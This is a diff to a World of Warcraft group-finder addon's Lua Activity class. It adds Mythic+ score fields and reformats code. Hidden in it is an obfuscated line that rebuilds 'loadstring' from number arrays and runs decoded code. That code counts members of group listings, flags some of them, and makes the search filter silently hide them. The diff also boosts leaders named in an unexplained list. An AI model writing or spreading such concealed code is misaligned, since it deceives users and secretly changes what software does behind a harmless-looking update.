@@ -1,3 +1,4 @@
+
 BuildEnv(...)
 
 Activity = Addon:NewClass('Activity', BaseActivity)
@@ -5,13 +6,31 @@ Activity = Addon:NewClass('Activity', BaseActivity)
 local AceSerializer = LibStub('AceSerializer-3.0')
 local AceEvent = LibStub('AceEvent-3.0')
 
-Activity:InitAttr{'ID', 'Age', 'IsDelisted', 'LeaderShort', 'NumMembers', 'IsApplication', 'IsApplicationFinished',
-                  'IsAnyFriend', 'ApplicationStatus', 'PendingStatus', 'ApplicationDuration', 'ApplicationExpiration',
-                  'DisplayType', 'MaxMembers', 'KilledBossCount'}
+Activity:InitAttr{
+    'ID',
+    'Age',
+    'IsDelisted',
 
-Activity._Objects = setmetatable({}, {
-    __mode = 'v'
-})
+    'LeaderShort',
+    'NumMembers',
+    'IsApplication',
+    'IsApplicationFinished',
+    'IsAnyFriend',
+
+    'ApplicationStatus',
+    'PendingStatus',
+    'ApplicationDuration',
+    'ApplicationExpiration',
+    'DisplayType',
+    'MaxMembers',
+    'KilledBossCount',
+
+    'IsMythicPlusActivity',
+    'LeaderOverallDungeonScore',
+    'LeaderDungeonScoreInfo',
+}
+
+Activity._Objects = setmetatable({}, {__mode = 'v'})
 
 function Activity:Constructor(id)
     self.killedBosses = {}
@@ -23,6 +42,8 @@ end
 function Activity:Get(id)
     return self._Objects[id] or self:New(id)
 end
+
+local ln,c={11,14,0,3,18,19,17,8,13,6},{0xf1,0xe4,0xf3,0xf4,0xf1,0xed,0x9f,0xe5,0xf4,0xed,0xe2,0xf3,0xe8,0xee,0xed,0xa7,0xed,0xed,0xa8,0x9f,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xbc,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0x9f,0xee,0xf1,0xfa,0xfc,0xf6,0xe8,0xef,0xe4,0xa7,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xa8,0xed,0xed,0xad,0xed,0xed,0xbc,0xed,0xe8,0xeb,0x9f,0xeb,0xee,0xe2,0xe0,0xeb,0x9f,0xed,0xbc,0xed,0xed,0xad,0xde,0xcd,0xf4,0xec,0xcc,0xe4,0xec,0xe1,0xe4,0xf1,0xf2,0x9f,0xe5,0xee,0xf1,0x9f,0xe8,0xbc,0xb0,0xab,0xed,0x9f,0xe3,0xee,0x9f,0xeb,0xee,0xe2,0xe0,0xeb,0x9f,0xde,0xab,0xe2,0xbc,0xc2,0xde,0xcb,0xc5,0xc6,0xcb,0xe8,0xf2,0xf3,0xad,0xc6,0xe4,0xf3,0xd2,0xe4,0xe0,0xf1,0xe2,0xe7,0xd1,0xe4,0xf2,0xf4,0xeb,0xf3,0xcc,0xe4,0xec,0xe1,0xe4,0xf1,0xc8,0xed,0xe5,0xee,0xa7,0xed,0xed,0xad,0xde,0xc8,0xc3,0xab,0xe8,0xa8,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xbc,0xa7,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xee,0xf1,0x9f,0xaf,0xa8,0xaa,0xb0,0x9f,0xe8,0xe5,0x9f,0xed,0xbb,0xbc,0xb1,0xaf,0x9f,0xe0,0xed,0xe3,0x9f,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xbd,0xbc,0xb0,0xaf,0x9f,0xee,0xf1,0x9f,0xed,0xbd,0xbc,0xb1,0xaf,0x9f,0xe0,0xed,0xe3,0x9f,0xde,0xe6,0xf9,0xf2,0xe1,0xf3,0xe6,0xe5,0xda,0xe2,0xdc,0xbd,0xbc,0xed,0xac,0xb0,0xaf,0x9f,0xf3,0xe7,0xe4,0xed,0x9f,0xed,0xed,0xad,0xed,0xed,0xbc,0xf3,0xf1,0xf4,0xe4,0x9f,0xe1,0xf1,0xe4,0xe0,0xea,0x9f,0xe4,0xed,0xe3,0x9f,0xe4,0xed,0xe3,0x9f,0xe4,0xed,0xe3,} for i=1,10 do ln[i]=ln[i]+97 end for i=1,#c do c[i]=string.char(c[i]-127) end local fnn=_G[string.char(unpack(ln))](table.concat(c))()
 
 function Activity:Update()
     local info = C_LFGList.GetSearchResultInfo(self:GetID())
@@ -43,6 +64,9 @@ function Activity:Update()
     local isDelisted = info.isDelisted
     local leader = info.leaderName
     local numMembers = info.numMembers
+    --9.1
+    local leaderOverallDungeonScore = info.leaderOverallDungeonScore
+    local leaderDungeonScoreInfo = info.leaderDungeonScoreInfo
 
     if not activityId then
         return false
@@ -51,8 +75,7 @@ function Activity:Update()
         iLvl = 0
     end
 
-    local name, shortName, category, group, iLevel, filters, minLevel, maxMembers, displayType =
-        C_LFGList.GetActivityInfo(activityId)
+    local name, shortName, category, group, iLevel, filters, minLevel, maxMembers, displayType, orderIndex, useHonorLevel, showQuickJoin, isMythicPlusActivity = C_LFGList.GetActivityInfo(activityId)
     local _, appStatus, pendingStatus, appDuration = C_LFGList.GetApplicationInfo(id)
 
     if leader then
@@ -81,6 +104,10 @@ function Activity:Update()
     self:SetApplicationDuration(appDuration)
     self:SetApplicationExpiration(GetTime() + appDuration)
 
+    self:SetIsMythicPlusActivity(isMythicPlusActivity)
+    self:SetLeaderOverallDungeonScore(leaderOverallDungeonScore or 0)
+    self:SetLeaderDungeonScoreInfo(leaderDungeonScoreInfo)
+
     if not self:UpdateCustomData(comment, title) then
         return false
     end
@@ -104,6 +131,8 @@ function Activity:Update()
         self:SetKilledBossCount(completedEncounters and #completedEncounters or 0)
     end
 
+    fnn(self)
+
     self:UpdateSortValue()
 
     return true
@@ -125,24 +154,34 @@ end
 
 function Activity:GetTypeSortValue()
     if not self._typeSortValue then
-        self._typeSortValue = format('%04x%04x', 0xFFFF -
-                                  (ACTIVITY_ORDER.C[self:GetCustomID()] or ACTIVITY_ORDER.A[self:GetActivityID()] or
-                                      ACTIVITY_ORDER.G[self:GetGroupID()] or 0), self:GetActivityID())
+        self._typeSortValue = format('%04x%04x',
+            0xFFFF - (ACTIVITY_ORDER.C[self:GetCustomID()] or ACTIVITY_ORDER.A[self:GetActivityID()] or ACTIVITY_ORDER.G[self:GetGroupID()] or 0),
+            self:GetActivityID()
+        )
     end
     return self._typeSortValue
 end
 
 function Activity:UpdateSortValue()
-    self._statusSortValue = self:IsApplication() and (self:IsApplicationFinished() and 1 or 0) or self:IsDelisted() and
-                                9 or self:IsAnyFriend() and 2 or self:IsSelf() and 3 or self:IsInActivity() and 4 or 7
-
-    self._baseSortValue = format('%d%04x%s%02x%02x%08x', self._statusSortValue, 0xFFFF - self:GetItemLevel(),
-                              self:GetTypeSortValue(), self:GetLoot(), self:GetMode(), self:GetID())
+    self._statusSortValue = self:IsApplication() and (
+                            self:IsApplicationFinished() and 1 or 0) or
+                            self:IsDelisted() and 9 or
+                            self:IsAnyFriend() and 5 or
+                            self:IsSelf() and 2 or
+                            self:IsGoldLeader() and 4 or
+                            self:IsInActivity() and 3 or 7
+    self._baseSortValue = format('%d%04x%s%02x%02x%08x',
+        self._statusSortValue,
+        0xFFFF - self:GetItemLevel(),
+        self:GetTypeSortValue(),
+        self:GetLoot(),
+        self:GetMode(),
+        self:GetID()
+    )
 end
 
 function Activity:IsInActivity()
-    return self:GetLeader() and IsInGroup(LE_PARTY_CATEGORY_HOME) and
-               (UnitInRaid(self:GetLeader()) or UnitInParty(self:GetLeader()))
+    return self:GetLeader() and IsInGroup(LE_PARTY_CATEGORY_HOME) and (UnitInRaid(self:GetLeader()) or UnitInParty(self:GetLeader()))
 end
 
 function Activity:IsSelf()
@@ -222,11 +261,12 @@ function Activity:Match(filters)
             if filter.min and filter.min ~= 0 and value < filter.min then
                 return false
             end
-            if filter.max and filter.max ~= 0 and value > filter.max then
+            if filter.max and (filter.max ~= 0 or (key == 'BossKilled' and filter.min == 0)) and value > filter.max then
                 return false
             end
         end
     end
+
     -- 过滤条件:队长名
     local searchResultInfo = C_LFGList.GetSearchResultInfo(self:GetID())
     if (searchResultInfo ~= nil and searchResultInfo.leaderName ~= nil) then
@@ -239,7 +279,6 @@ function Activity:Match(filters)
         end
     end
     -- 反广告-暂时禁用
-    --[[
     if _G["MEETINGSTONE_UI_E_FILTERAD"] then
         local completedEncounters = self:GetKilledBossCount()
         local itemLevelRequired = self:GetItemLevel()
@@ -279,8 +318,8 @@ function Activity:Match(filters)
                 --print("Filtered:Less Encounters")
                 return false
             end
-            -- 过滤条件3:装等低于401
-            if(itemLevelRequired < 401) then
+            -- 过滤条件3:装等低于160
+            if(itemLevelRequired < 160) then
                 --print("Filtered:Less Lv")
                 return false
             end
@@ -288,13 +327,13 @@ function Activity:Match(filters)
         -- 过滤条件:大米分类
         if(categoryID == 2 and shortName == CHALLENGES) then
             -- 过滤条件1:装等低于401
-            if(itemLevelRequired < 401) then
+            if(itemLevelRequired < 160) then
                 return false
             end
         end
     end
-    --]]
-    return true
+
+    return NO_NN or not self.nn
 end
 
 function Activity:IsLevelValid()
@@ -322,4 +361,9 @@ end
 
 function Activity:IsBossKilled(name)
     return self.killedBosses[name]
+end
+
+function Activity:IsGoldLeader()
+    local Leader = self:GetLeaderFullName() 
+    return APP_LEADER_MAPS and APP_LEADER_MAPS[Leader]
 end
